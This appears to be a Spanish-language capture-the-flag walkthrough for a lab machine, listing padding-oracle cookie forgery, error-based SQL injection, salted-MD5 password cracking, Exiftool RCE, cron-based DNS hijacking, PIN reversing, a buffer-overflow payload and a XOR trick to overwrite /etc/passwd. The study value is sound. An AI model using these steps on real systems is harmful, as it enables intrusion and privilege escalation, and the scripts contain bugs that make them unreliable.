## Tecnicas utilizadas
-   Padding Oracle Attack (Padbuster)
-   Padding Oracle Attack (Bit Flipper Attack - BurpSuite) [EXTRA]
-   Cookie Hijacking
-   SQL Injection (Generic UNION query) [SQLI] - Error Based
-   Breaking Password
-   Upload File - Abusing Exiftool (RCE)
-   DNS Hijacking (Abusing Cron Job)
-   Ghidra Binary Analysis
-   Reversing Code (Computing valid PIN)
-   Buffer overflow (Controlling the program and manipulating its flow to desired functions)
-   Abusing Decryption Function (XOR Trick) [Privilege Escalation]
## Procedimiento
- Padbuster para descifrar la cookie(*CBC - Bite flippling attack*)
![[Pasted image 20230205122709.png]]
- Una forma alternativa seria con burpsuite, registramos un usuario que sea similar a *Admin*, por ejemplo *bdmin*, pasamos la peticion de la pagina por burpsuite y mandamos la peticion al repeter para brute forcear la peticion. Selecionamos en Payload type -> Bit flipper. Format of original data -> Literal value. Y desactivamos el URL encoding de la ultima sección.
- Sqlinjetion en el url encontrado en logs, este es basado en error.
- Python3 Scriptiong ->
```python
#!/usr/bin/python3

import hashlib, pdb

# Agregamos el salt obtenido de la base de datos de cmsmsdb de la tabla sitepref_value
salt = '$salt'

# Contraseñas encontradas en la base de datos de cmsmsdb en la table cms_users
password = '$password'

# Diccionario con el que vamos a romper la contraseña
dictionary = '/path/to/wordlist'

f = open(dictionary, "rb")

for possible_pass in f.readline(): 
	
	possible_pass = possible_pass.strip()
	
	
	if hashlib.md5(salt.encode() + possible_pass).hexdigest() == password:
		print("[+] La password es %s" % possible_pass.decode())
		break

```
- Loguearnos en el nuevo panel de autentificacion descubierto.
- Explotar la version de Exiftool con el repositorio de github
- Nos aprovechamos de la tarea cron que ejecuta el script que usa bash contra una url 
- Analisamos el Binary encontrado en la ruta opt con Ghidra. Vamos a la funcion *Check Pin*, renemobramos las variables para que sea mas legible y entendible. Con gdb hacemos un dissas de la funcion *random* y por ultimo hacemos un break en **\*random+57**.
- Copiamos la funcion random, creamos un archivo y peguamos todo para tenermo en modo de traza.
- Python3 Scripting ->
```python
#!/usr/bin/python3

import ctypes
i = 0
local_c = $local_c

initial_local_c = $local_c

while (i < 10):
	
	local_c = local_c * 0x59 + 0x14
	i += 1

print(ctypes.c_int(local_c ^ initial_local_c).value)
	
	
```
- Creamos un patron con **Gef**
- Usamos `pattern offset $eip` y vemos cuantos characters son necesarios para desbordar el buffer.
- Como el NX esta habilitado,  no podemos hacer llamadas de sistema para ejecutar una shell. Asi que vamos por la funcion *encrypt* que esta en el binario, podemos desarmarla con `dissas encrypt` para posteriormente obtener su direccion(*El primer resultado*) creamos un patron con python que nos arroje las AAA correspondientes y al final podemos la direccion de la funcion *encrypt* `python3 -c 'print("A"*44 + "\x5b\x58\x55\x56 ")'`
- Creamos un script en python que nos encripte un archivo para que con el *XOR* de la funcion encrypt del binario, nos lo desencripte en texto claro donde nosotros queramos(*este caso /etc/passwd*)
```python

#!/usr/bin/python3

plaintext_file = "/path/to/file"
output_encrypted_file = "/path/to/output"

plaintext = open(plaintext_file, "rb")
output = open(output_encrypted_file, "wb")

for line in plaintext:
	output.write(bytes([line ^ 0x9b]))
```
- El archivo encriptado final, debe llamarse igual que el archivo al que queramos sustituir(*passwd*)